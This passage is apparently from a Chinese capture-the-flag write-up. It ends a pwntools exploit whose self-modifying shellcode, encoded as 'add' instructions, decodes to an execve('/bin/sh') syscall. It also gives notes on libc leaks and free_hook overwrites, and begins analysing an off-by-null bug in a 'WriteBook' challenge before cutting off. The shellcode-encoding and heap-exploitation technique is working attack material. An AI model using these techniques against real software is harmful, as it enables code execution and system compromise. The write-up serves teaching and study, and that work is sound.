    ''')
    # padding 无意义指令 铺垫
    buf += asm('''
     add cl,  BYTE PTR [rdx]
     add cl,  BYTE PTR [rdx]
     add cl,  BYTE PTR [rdx+rax*1]
    ''')
    buf += b"\x00"*(0x27-len(buf))  # 长度填充至0x27
    # or     al,BYTE PTR [rcx] 目的是为上面初始化ecx预留数据
    buf += b"\x0a\x01"  # shellcode运行到这里生成指令 xor ecx,ecx   字节码0x31c9
    # rcx = 0x200   rip+0x30f 指向后面构造的数据0x200，至此buf长度为0x2f
    buf += asm('''
     add ecx, DWORD PTR [rip+0x30f]
    ''')
    # 真正的shellcode在buf+0x200处
    # push rdx   # 0x52
    buf += asm('''
     add al, 1
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
    ''')
    # pop rdi    # 0x5f
    buf += asm('''
     add cl, byte PTR [rdx] 
     add al, 6
     add byte PTR [rdx+rcx*1], al
     add al, 1
     add byte PTR [rdx+rcx*1], al
    ''')
    # al = 0x30
    # add rdi, 0x30f  # 4881c70f030000
    buf += asm('''
     add cl, byte PTR [rdx]
     add al, 0xf
     add al, 1
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add cl, byte PTR [rdx]
     add cl, byte PTR [rdx]
     add cl, byte PTR [rdx]
    ''')
    # al = 0x40
    # xor esi, esi  # 0x31f6
    buf += asm('''
     add cl, byte PTR [rdx]
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
    ''')
    # al = 0x30
    # xor edx, edx  # 0x31d2
    buf += asm('''
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add al, 1
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
    ''')
    # al = 0x31
    # push 0x3b  # 0x6a3b
    buf += asm('''
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
    ''')
    # al = 0x31
    # pop rax  # 0x58
    buf += asm('''
     add cl, byte PTR [rdx]
     add al, 0xf
     add al, 0xf
     add al, 0x9
     add byte PTR [rdx+rcx*1], al
    ''')
    # al = 0x58
    # make /bin/sh
    # rcx = 0x20f     至此buf长度为0xd0  [rip+0x20f] = 0x100
    buf += asm('''
     add ecx, DWORD PTR [rip+0x20f]
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0x5
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add al, 2
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
    ''')
    # padding  铺垫 指令长度2
    buf += asm('''
     add cl,  BYTE PTR [rdx]
    ''')*((0x200-len(buf))//2 - 1)
    # padding 指令长度3
    buf += asm('''
     add cl, byte PTR [rdx+rax*1]
    ''')
    buf += b"\x00\x00\x08\x01\x07\x0f\x03\x00\x00\x01\x06\x01\x0e\x08\x0a\x00\x0f\x05"
    buf += b"\x00"*(0x2df-len(buf))
    buf += b"\x00\x01"# rcx = 0x30f
    buf += b"\x00"*(0x30f-len(buf))
    buf += b"\x0f\x02\x09\x0e\x0f\x0d\x02"# /bin/sh
    buf += b"\x00"*(0x30f+0x2f-len(buf))
    buf += b"\x00\x02"# rcx = 0x200
    buf += b"\x00"*(1000-len(buf)) # padding 可去
    s.sendline(flag+buf) # 上一步没有padding，此处应变为s.send()
    '''
    0x563fc87904a4    push   rdx
    0x563fc87904a5    pop    rdi
    0x563fc87904a6    add    rdi, 0x30f #/bin/sh
    0x563fc87904ad    xor    esi, esi
    0x563fc87904af    xor    edx, edx
    0x563fc87904b1    push   0x3b
    0x563fc87904b3    pop    rax
    0x563fc87904b4    syscall  
    '''
    s.interactive()
###  注意
  1. unsortedbin泄露libc方法，切割unsortedbin让mainarea地址落到下一个已分配的chunk内（通常可以配合堆溢出修改size来实现）。
  2. 此题freehook利用被限制（*buf = 4），必须通过溢出来进行地址写入。
  3. 触发freehook条件：将freehook修改为system后，free的chunk的fd必须是’/bin/sh’。
###  链接
  1. 
  2. 
  3. 
## PWN -> WriteBook
###  题目分析
程序仍然是保护全开，编译环境是3ubuntu1~18.04，运行程序：
    ======[Write a Book!]======
    1. New page
    2. Write paper
    3. Read paper
    4. Destroy the page
    5. Repick
    >
功能new、write、read、destroy，增改查删功能，通过ida查看主要的漏洞点在write函数
    unsigned __int64 __fastcall sub_D6C(__int64 a1, int a2)
    {
      unsigned int v2; // eax
      char buf; // [rsp+13h] [rbp-Dh] BYREF
      unsigned int v5; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v6; // [rsp+18h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      v5 = 0;
      if ( a2 )
      {
        while ( v5 != a2 )
        {
          if ( read(0, &buf, 1uLL) != 1 )
          {
            puts("read error");
            exit(-1);
          }
          if ( buf == '\n' )
            break;
          v2 = v5++;
          *(_BYTE *)(v2 + a1) = buf;
        }
        *(_BYTE *)(v5 + a1) = 0;                    // offbynull
      }
      return __readfsqword(0x28u) ^ v6;
存在off by null漏洞。  
new函数：
    unsigned __int64 sub_ABC()
    {
      unsigned int v0; // ebx
      unsigned int v1; // ebx
      size_t size; // [rsp+Ch] [rbp-24h] BYREF
      unsigned int i; // [rsp+14h] [rbp-1Ch]
      unsigned __int64 v5; // [rsp+18h] [rbp-18h]
      v5 = __readfsqword(0x28u);
      for ( i = 0; i  ");
            __isoc99_scanf("%d", (char *)&size + 4);
            if ( HIDWORD(size) == 1 )
              break;
            if ( HIDWORD(size) != 2 )
              return __readfsqword(0x28u) ^ v5;
            printf("size: ");
            __isoc99_scanf("%d", &size);
            if ( (unsigned int)size > 0x10F )
            {
              if ( (unsigned int)size <= 0x1E0 )
              {
                v1 = 2 * i;
                qword_202060[v1] = malloc((unsigned int)size);
                if ( !qword_202060[2 * i] )
                  goto LABEL_20;
    LABEL_11:
                qword_202060[2 * i + 1] = (unsigned int)size;
                printf("page #%d\n", i);
                return __readfsqword(0x28u) ^ v5;
              }
              puts("can you not write that much?");
            }
            else
            {
              puts("don't waste pages -.-");
            }
          }